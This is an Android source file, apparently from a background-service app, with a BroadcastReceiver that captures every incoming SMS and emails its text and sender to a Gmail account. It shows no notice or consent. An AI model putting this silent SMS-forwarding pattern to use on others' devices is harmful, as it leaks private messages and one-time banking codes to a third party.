package com.example.persistentbackgroundservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import static com.example.persistentbackgroundservice.EmailRoutines.send_email_using_gmail;


public class MessageReceiver extends BroadcastReceiver {
    String TAG = "MessageReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        //message will be holding complete sms that is received
        SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        for(SmsMessage sms : messages)
        {
            String msg = sms.getMessageBody();
            Log.i(TAG, msg);

            String subject = String.format("SMS Transaction [%s]", sms.getOriginatingAddress());

            send_email_using_gmail(subject, msg);

            Log.i(TAG, "Email sent successfully.");
        }
    }
}
